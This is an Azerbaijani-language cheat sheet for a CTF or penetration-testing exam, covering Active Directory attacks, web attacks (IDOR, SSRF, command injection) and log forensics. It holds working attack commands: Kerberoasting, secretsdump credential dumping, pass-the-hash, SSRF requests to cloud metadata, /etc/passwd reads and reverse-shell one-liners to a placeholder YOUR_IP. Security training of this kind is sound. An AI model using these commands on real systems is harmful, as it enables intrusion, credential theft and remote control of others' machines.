@@ -1,0 +1,138 @@
+Bu tam praktiki CTF və ya sızma testi imtahanı üçün mövzular üzrə birbaşa işinizə yarayacaq **fəaliyyət metodologiyasını** və **ən çox istifadə olunan əmrləri (cheat-sheet formatında)** aşağıda qruplaşdırdım. Nəzəriyyəni kənara qoyub, birbaşa terminalda tətbiq edə biləcəyiniz hissələrə keçək.
+## I. Active Directory (AD) Environment Exploitation & Lateral Movement
+AD mühitində əsas məqsəd ilkin girişdən (Initial Access) sonra Domain Admin statusuna qədər yüksəlməkdir.
+### 1. Kəşfiyyat (Enumeration)
+İlkin istifadəçi məlumatlarınız (credential) varsa və ya anonim giriş mümkündürsə:
+ * **BloodHound ilə məlumat toplama (Ən effektiv üsul):**
+   ```bash
+   bloodhound-python -u 'username' -p 'password' -d domain.local -dc dc01.domain.local -c All
+   
+   ```
+ * **CrackMapExec (CME) / NetExec ilə yoxlamalar:**
+   ```bash
+   # Şifrənin doğruluğunu və SMB hüquqlarını yoxlamaq
+   nexec smb 10.10.10.x -u 'username' -p 'password'
+   # Şifrə siyasətini (Password Policy) öyrənmək
+   nexec smb 10.10.10.x -u 'username' -p 'password' --pass-pol
+   
+   ```
+ * **Impacket alətləri ilə istifadəçi siyahısını çəkmək:**
+   ```bash
+   impacket-lookupsid domain.local/'username':'password'@10.10.10.x
+   
+   ```
+### 2. Hücum və İstismar (Exploitation)
+ * **Kerberoasting (SPN qeydi olan istifadəçilərin TGS biletlərini çəkmək):**
+   ```bash
+   impacket-GetUserSPNs domain.local/'username':'password' -dc-ip 10.10.10.x -request -outputfile hashes.kerberoast
+   # Hash-i qırmaq üçün:
+   hashcat -m 13100 hashes.kerberoast wordlist.txt
+   
+   ```
+ * **AS-REP Roasting (Kerberos Pre-Authentication tələb etməyən istifadəçilər):**
+   ```bash
+   impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.x -format hashcat -outputfile hashes.asrep
+   # Hash-i qırmaq üçün:
+   hashcat -m 18200 hashes.asrep wordlist.txt
+   
+   ```
+### 3. Lateral Movement & Privilege Escalation
+ * **SecretsDump (SAM, LSA və NTDS.dit bazasından hash-lərin çəkilməsi):**
+   ```bash
+   impacket-secretsdump domain.local/'username':'password'@10.10.10.x
+   
+   ```
+ * **Pass-The-Hash (PtH) hücumu ilə daxil olmaq (Şifrə olmadan, sadəcə NTLM hash ilə):**
+   ```bash
+   impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:5fbc... domain.local/administrator@10.10.10.x
+   # Alternativ olaraq Evil-WinRM ilə (əgər 5985 portu açıqdırsa):
+   evil-winrm -i 10.10.10.x -u administrator -H 5fbc...
+   
+   ```
+## II. Web Application Attacks
+### 1. IDOR (Insecure Direct Object References)
+ * **Metodologiya:** Parametrlərdəki (?id=1, ?user_id=1001, /api/v1/profile/123) dəyərləri dəyişərək başqa istifadəçilərin məlumatlarına çatmaq.
+ * **Praktika (Burp Suite):**
+   1. İsteyi tutun (Intercept).
+   2. Parametrin rəqəm və ya asan təxmin edilən UUID olduğunu yoxlayın.
+   3. **Burp Intruder** vasitəsilə ID hissəsini seçib Numbers payload tipi ilə avtomatlaşdırılmış şəkildə artırın (1-1000). Status kodu və ya Response Length fərqliliklərinə baxın.
+### 2. SSRF (Server-Side Request Forgery)
+ * **Metodologiya:** Veb tətbiqi məcbur etmək ki, daxili şəbəkəyə (localhost və ya daxili IP) sorğu göndərsin.
+ * **Praktiki Payload-lar:**
+   ```http
+   # Daxili portları skan etmək üçün:
+   http://victim.com/preview?url=http://127.0.0.1:80
+   http://victim.com/preview?url=http://127.0.0.1:22
+   
+   # Bulud mühitində (AWS/Azure) metadata çəkmək üçün:
+   http://victim.com/preview?url=http://169.254.169.254/latest/meta-data/
+   
+   # Sızma testi zamanı daxili şəbəkə skanı:
+   http://victim.com/preview?url=http://192.168.1.1
+   
+   ```
+### 3. Command Injection (Əmr İnyeksiyası)
+ * **Metodologiya:** Sistem əmrlərini icra etdirən funksiyalara (ping, nslookup və s.) öz zərərli kodumuzu qoşmaq.
+ * **Praktiki Operatorlar:** ;, &&, |, ||, %0a (New line)
+ * **Praktiki Payload-lar:**
+   ```bash
+   # Linux üçün test:
+   127.0.0.1; whoami
+   127.0.0.1 && cat /etc/passwd
+   127.0.0.1 | id
+   
+   # Windows üçün test:
+   127.0.0.1 && whoami /priv
+   127.0.0.1 || type C:\Windows\win.ini
+   
+   # Reverse Shell almaq (Linux):
+   127.0.0.1; bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'
+   127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f
+   
+   ```
+## III. Log Analysis & Incident Forensics
+Bu mərhələdə əsas işiniz terminal alətləri (grep, awk, sed) vasitəsilə log fayllarında hücumçunun izlərini tapmaqdır.
+### 1. Web Log Analizi (Apache/Nginx)
+Hücumçunun hansı faylları hədəf aldığını və skan etdiyini tapmaq üçün:
+ * **Ən çox sorğu göndərən IP ünvanlarını tapmaq:**
+   ```bash
+   cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10
+   
+   ```
+ * **Uğurlu (200 OK) Command Injection və ya SQLi cəhdlərini süzgəcdən keçirmək:**
+   ```bash
+   grep "200" access.log | grep -E "(whoami|cat|id|/etc/passwd|UNION|SELECT)"
+   
+   ```
+ * **Hücumçunun istifadə etdiyi alətləri (User-Agent) tapmaq:**
+   ```bash
+   cat access.log | awk -F '"' '{print $6}' | sort | uniq -c | sort -nr
+   # Nmap, Sqlmap, Nikto, Dirbuster kimi izləri axtarın
+   
+   ```
+### 2. Linux Auth (Sistem Giriş) Log Analizi
+ * **Uğursuz SSH giriş cəhdlərini (Brute Force) yoxlamaq:**
+   ```bash
+   grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
+   
+   ```
+ * **Uğurlu daxil olan istifadəçiləri və IP-ləri tapmaq:**
+   ```bash
+   grep "Accepted password" /var/log/auth.log
+   # və ya session açılma izləri:
+   grep "session opened" /var/log/auth.log
+   
+   ```
+### 3. Windows Event Log (.evtx) Analizi (Əgər fayl verilibsə)
+Əgər imtahanda .evtx faylı verilsə, Linux mühitindəsinizsə python-evtx və ya evtx_dump istifadə edə bilərsiniz:
+ * **Mühüm Event ID-lər (Bunları mütləq grep edin):**
+   * **4624:** Uğurlu Giriş (Logon type 3 = Şəbəkə/SMB, Logon type 10 = RDP).
+   * **4625:** Uğursuz Giriş cəhdi (Brute Force göstəricisi).
+   * **4688:** Yeni prosesin başladılması (Məsələn, cmd.exe və ya powershell.exe işə düşibsə əmrləri görmək üçün).
+   * **4720:** Yeni istifadəçi yaradılması (Persistency izi).
+ * **EvtxDump aləti ilə analiz əmri:**
+   ```bash
+   evtx_dump security.evtx | grep -E "4624|4625|4688" -A 5
+   
+   ```
+Uğurlar! İmtahan vaxtı hər bir tapşırıqda qarşılaşdığınız dəyərləri (IP, Port, Parametr) yuxarıdakı şablonlarda sürətlə əvəz edərək tətbiq edin.
